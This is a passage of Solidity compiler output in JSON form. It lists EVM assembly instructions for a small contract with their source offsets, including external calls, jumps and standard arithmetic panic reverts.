											"source": 1,
											"value": "16"
										},
										{
											"begin": 720,
											"end": 736,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 720,
											"end": 736,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 672,
											"end": 831,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 672,
											"end": 831,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 672,
											"end": 831,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 672,
											"end": 831,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "PUSH",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 799,
											"end": 804,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 804,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 799,
											"end": 804,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 799,
											"end": 804,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 799,
											"end": 804,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 799,
											"end": 809,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 799,
											"end": 809,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 799,
											"end": 809,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 810,
											"end": 815,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 799,
											"end": 816,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 799,
											"end": 816,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 799,
											"end": 816,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 799,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 672,
											"end": 831,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 672,
											"end": 831,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 366,
											"end": 841,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 366,
											"end": 841,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 366,
											"end": 841,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 7,
											"end": 84,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 73,
											"end": 78,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 62,
											"end": 78,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 62,
											"end": 78,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 7,
											"end": 84,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 90,
											"end": 270,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 90,
											"end": 270,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 138,
											"end": 215,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 135,
											"end": 136,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 128,
											"end": 216,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 235,
											"end": 239,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 232,
											"end": 233,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 225,
											"end": 240,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 259,
											"end": 263,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 256,
											"end": 257,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 249,
											"end": 264,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"name": "tag",
											"source": 2,
											"value": "8"
										},
										{
											"begin": 276,
											"end": 470,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 316,
											"end": 320,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 336,
											"end": 356,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 354,
											"end": 355,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 336,
											"end": 356,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 336,
											"end": 356,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 336,
											"end": 356,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 336,
											"end": 356,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 331,
											"end": 356,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 331,
											"end": 356,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 370,
											"end": 390,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 388,
											"end": 389,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 370,
											"end": 390,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 370,
											"end": 390,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 370,
											"end": 390,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 370,
											"end": 390,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 365,
											"end": 390,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 365,
											"end": 390,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 414,
											"end": 415,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 411,
											"end": 412,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 407,
											"end": 416,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 399,
											"end": 416,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 399,
											"end": 416,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 438,
											"end": 439,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 432,
											"end": 436,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 429,
											"end": 440,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 426,
											"end": 463,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 426,
											"end": 463,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 426,
											"end": 463,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 443,
											"end": 461,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 443,
											"end": 461,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 443,
											"end": 461,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 443,
											"end": 461,
											"name": "tag",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 443,
											"end": 461,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 426,
											"end": 463,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 426,
											"end": 463,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 276,
											"end": 470,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 476,
											"end": 656,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 476,
											"end": 656,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 524,
											"end": 601,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 521,
											"end": 522,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 514,
											"end": 602,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 621,
											"end": 625,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 618,
											"end": 619,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 611,
											"end": 626,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 645,
											"end": 649,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 642,
											"end": 643,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 635,
											"end": 650,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"name": "tag",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 662,
											"end": 847,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 702,
											"end": 703,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 719,
											"end": 739,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 737,
											"end": 738,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 719,
											"end": 739,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 719,
											"end": 739,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 719,
											"end": 739,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 719,
											"end": 739,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 714,
											"end": 739,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 714,
											"end": 739,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 753,
											"end": 773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 771,
											"end": 772,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 753,
											"end": 773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 753,
											"end": 773,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 753,
											"end": 773,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 753,
											"end": 773,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 748,
											"end": 773,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 748,
											"end": 773,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 792,
											"end": 793,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 782,
											"end": 817,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 782,
											"end": 817,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 797,
											"end": 815,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 797,
											"end": 815,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 797,
											"end": 815,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 797,
											"end": 815,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 797,
											"end": 815,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 782,
											"end": 817,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 782,
											"end": 817,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 839,
											"end": 840,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 836,
											"end": 837,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 832,
											"end": 841,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 827,
											"end": 841,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 827,
											"end": 841,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 662,
											"end": 847,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 853,
											"end": 943,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 853,
											"end": 943,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 887,
											"end": 894,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 930,
											"end": 935,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 923,
											"end": 936,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 916,
											"end": 937,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 905,
											"end": 937,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 905,
											"end": 937,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 853,
											"end": 943,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 853,
											"end": 943,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 853,
											"end": 943,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 853,
											"end": 943,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 949,
											"end": 1058,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 949,
											"end": 1058,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1030,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1045,
											"end": 1050,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1030,
											"end": 1051,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 1030,
											"end": 1051,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1030,
											"end": 1051,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1030,
											"end": 1051,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1025,
											"end": 1028,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1018,
											"end": 1052,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 949,
											"end": 1058,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 949,
											"end": 1058,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 949,
											"end": 1058,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "tag",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1151,
											"end": 1155,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1189,
											"end": 1191,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1178,
											"end": 1187,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1174,
											"end": 1192,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1166,
											"end": 1192,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1166,
											"end": 1192,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1202,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1264,
											"end": 1265,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1253,
											"end": 1262,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1249,
											"end": 1266,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1240,
											"end": 1246,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1202,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1202,
											"end": 1267,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1202,
											"end": 1267,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1202,
											"end": 1267,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1064,
											"end": 1274,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1361,
											"end": 1478,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1361,
											"end": 1478,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1470,
											"end": 1471,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1467,
											"end": 1468,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1460,
											"end": 1472,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1607,
											"end": 1723,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1607,
											"end": 1723,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1677,
											"end": 1698,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1692,
											"end": 1697,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1677,
											"end": 1698,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 1677,
